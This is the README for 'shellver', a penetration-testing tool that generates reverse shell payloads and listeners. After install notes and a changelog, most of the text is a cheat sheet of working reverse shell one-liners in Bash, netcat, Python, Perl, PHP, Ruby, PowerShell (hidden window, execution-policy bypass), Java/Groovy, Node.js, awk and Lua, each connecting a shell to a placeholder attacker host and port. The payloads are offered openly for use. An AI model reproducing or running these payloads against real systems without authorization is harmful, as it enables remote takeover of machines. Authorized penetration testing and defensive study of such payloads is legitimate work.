                                                        .:: 0xR ::.
                                            .:: Reverse Shell Cheat Sheet Tool ::.
                                                 .:: cyber-warrior.org ::.
                                         .:: Heavily modified by Jonas A. Wendorf ::.

# Install Note
Clone the repository:

`git clone https://github.com/jonasw234/shellver.git`

Then go inside:

`cd shellver/`

Then install it:

`pip install --user -r requirements.txt`
 
if you want to use [pwncat](https://github.com/calebstewart/pwncat), you’ll also need to run

`pip install --user -r pwncat-requirements.txt`

and if you want to assist development, running

`pip install --user -r dev-requirements.txt`

will install the packages I use for formatting, linting and debugging.

Run `shellver -h` for help, `shellver shell` for reverse shells handled by a nc listener (universal), `shellver pwncat` for reverse shells handled by a [pwncat](https://github.com/calebstewart/pwncat) listener (Linux only) or `shellver msf` for msfvenom payloads.

Needs [msfpc](https://github.com/g0tmi1k/msfpc) for (most) msfvenom payloads.

# Changes from the original
- Upgraded to Python 3
- Automatically spawn listener for msfvenom payloads
- Use [msfpc](https://github.com/g0tmi1k/msfpc) instead of msfvenom for easier reuse (if functionality exists, otherwise recreates its behavior)
- Color coding for each different OS shell
- Reordered payloads a bit (at the beginning are only Linux payloads)
- No longer use Google DNS to find out LAN IP
- Remove `requests` dependency
- Automatically use `sudo` if needed
- Included support for [pwncat](https://github.com/calebstewart/pwncat)
- Try to bind only to the interface that was selected at the start
- Show only Windows reverse shells if invoked with [rlwrap](https://linux.die.net/man/1/rlwrap), only Linux reverse shells if [pwncat](https://github.com/calebstewart/pwncat) is selected as listener
- Some more listeners and msfvenom payloads
- Split requirements files into different categories
- Probably a bunch more stuff I’m currently forgetting

# Example
`shellver shell`

<img src="https://github.com/jonasw234/shellver/blob/master/ss/py.png" >

<img src="https://github.com/jonasw234/shellver/blob/master/ss/py2.png" >

(like it says you should use my [upgrade-tty](https://github.com/jonasw234/upgrade-tty) to upgrade your TTY for Linux systems if you’re not using [pwncat](https://github.com/calebstewart/pwncat)!) 

`shellver msf`

<img src="https://github.com/jonasw234/shellver/blob/master/ss/all.png" >

<img src="https://github.com/jonasw234/shellver/blob/master/ss/msfpc.png" >

(asks for `sudo` password because euid is not 0 and port is < 1024)

From https://github.com/swisskyrepo

When you know that you’re spawning a reverse shell from a Windows system, I suggest invoking shellver with [rlwrap](https://linux.die.net/man/1/rlwrap) for readline mappings, i.e.
```
rlwrap ./shellver.py shell
```

# Reverse Shell Methods
```
╔BASH TCP═══════════════════════════════════════════
║ bash -i >& /dev/tcp/xxx/yyy 0>&1
╠═══════════════════════════════════════════════════
║ 0<&196;exec 196<>/dev/tcp/xxx/yyy; sh <&196 >&196 2>&196
╚═══════════════════════════════════════════════════
╔BASH UDP═════════════╦═════════════════════════════
║ Run Target Machine  ║ sh -i >& /dev/udp/xxx/yyy 0>&1
╚═════════════════════╩═════════════════════════════

╔Netcat Traditional═════════════════════════════════
║ nc -e /bin/sh xxx yyy
╚═══════════════════════════════════════════════════
╔Netcat OpenBSD═════════════════════════════════════
║ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xxx yyy >/tmp/f
╚═══════════════════════════════════════════════════
╔NCAT═══════════════════════════════════════════════
║ ncat xxx yyy -e /bin/bash
╠═══════════════════════════════════════════════════
║ ncat --udp xxx yyy -e /bin/bash
╚═══════════════════════════════════════════════════

╔AWK════════════════════════════════════════════════
║ awk 'BEGIN {s = "/inet/tcp/0/xxx/yyy"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
╚═══════════════════════════════════════════════════

╔NODEJS═════════════════════════════════════════════
║(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(yyy, "xxx", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
╠═══════════════════════════════════════════════════
║ require('child_process').exec('nc -e /bin/sh xxx yyy')
╠═══════════════════════════════════════════════════
║var x = global.process.mainModule.require
x('child_process').exec('nc xxx yyy -e /bin/bash')
╚═══════════════════════════════════════════════════

╔PERL═══════════════════════════════════════════════
║ perl -e 'use Socket;$i="xxx";$p=yyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
╠═══════════════════════════════════════════════════
║ perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
╠══════════════╦════════════════════════════════════
║ Windows only ║ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"xxx:yyy");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
╚══════════════╩════════════════════════════════════

╔PYTHON═════════════════════════════════════════════
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
╠═══════════════════════════════════════════════════
║ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx",yyy));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
╠══════════════╦════════════════════════════════════
║ Windows only ║ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('xxx', yyy)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
╚══════════════╩════════════════════════════════════

╔PHP════════════════════════════════════════════════
║ php -r '$sock=fsockopen("xxx",yyy);exec("/bin/sh -i <&3 >&3 2>&3");'
╚═══════════════════════════════════════════════════

╔RUBY═══════════════════════════════════════════════
║ ruby -rsocket -e'f=TCPSocket.open("xxx",yyy).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
╠══════════════╦════════════════════════════════════
║ Windows only ║ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
╠══════════════╬════════════════════════════════════
║ Windows only ║ ruby -rsocket -e 'c=TCPSocket.new("xxx","yyy");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
╚══════════════╩════════════════════════════════════

╔POWERSHELL═════════════════════════════════════════
║ powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("xxx",yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
╠═══════════════════════════════════════════════════
║ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx',yyy);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
╚═══════════════════════════════════════════════════

╔JAVA═══════════════════════════════════════════════
║ r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/xxx/yyy;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
╚═══════════════════════════════════════════════════
╔JAVA for GROOVY════════════════════════════════════
║ String host="xxx";
int port=yyy;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
╠═══════════════════════════════════════════════════
║ String host="xxx";
int port=yyy;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
╚═══════════════════════════════════════════════════

╔LUA═════════╦══════════════════════════════════════
║ Linux only ║ lua -e "require('socket');require('os');t=socket.tcp();t:connect('xxx','yyy');os.execute('/bin/sh -i <&3 >&3 2>&3');"
╠════════════╩══════╦═══════════════════════════════
║ Windows and Linux ║ lua5.1 -e 'local host, port = "xxx", yyy local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
╚═══════════════════╩═══════════════════════════════
```

# TODO
- [ ] Make it possible to pass custom listeners  
- [x] Bind to specified interface only (or to all if no LAN IP address was used)  
- [x] If using [pwncat](https://github.com/calebstewart/pwncat) only show Linux (or universal) reverse shells  
- [x] If using [rlwrap](https://linux.die.net/man/1/rlwrap) only show Windows (or universal) reverse shells  
- [x] Make it possible to use non-default network interfaces when you have more than one  
- [x] Make it possible to use a completely different IP address if you create the payload on your machine but want to run the listener on a different (Internet exposed) server  
- [x] Sanity check for user inputs and ask for corrections  
- [x] `msfvenom` payloads where no compatible `msfpc` payload exists (e.g. shellcode) don’t automatically spawn a shell yet

# Thanks to
* [The original shellver](https://github.com/0xR0/shellver)
* [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
* [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Spawning a TTY Shell](http://netsec.ws/?p=337)
* [Obtaining a fully interactive shell](https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
* [pwncat](https://github.com/calebstewart/pwncat)
